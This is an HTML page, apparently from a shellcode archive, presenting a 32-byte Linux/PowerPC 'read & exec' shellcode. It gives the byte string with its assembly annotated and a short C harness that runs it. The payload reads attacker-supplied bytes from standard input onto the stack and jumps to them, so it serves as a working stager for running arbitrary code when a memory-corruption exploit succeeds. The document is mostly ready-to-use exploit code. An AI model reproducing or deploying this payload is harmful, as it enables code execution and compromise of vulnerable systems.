<html><head><title>Linux/ppc - read &amp; exec shellcode - 32 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* readnexecppc-core.c by Charles Stevenson &lt; core@bokeoa.com &gt; */
char hellcode[] = /* read(0,stack,1028); stack(); linux/ppc by core */
&quot;\x7c\x63\x1a\x79&quot;     /* xor.    r3,r3,r3 */
&quot;\x38\xa0\x04\x04&quot;     /* li      r5,1028 */
&quot;\x30\x05\xfb\xff&quot;     /* addic   r0,r5,-1025 */
&quot;\x7c\x24\x0b\x78&quot;     /* mr      r4,r1 */
&quot;\x44\xde\xad\xf2&quot;     /* sc */
&quot;\x69\x69\x69\x69&quot;     /* nop */
&quot;\x7c\x29\x03\xa6&quot;     /* mtctr   r1 */
&quot;\x4e\x80\x04\x21&quot;;    /* bctrl */

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte read &amp; exec shellcode for linux/ppc by core\n&quot;,
         strlen(hellcode));
  shell();
  return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
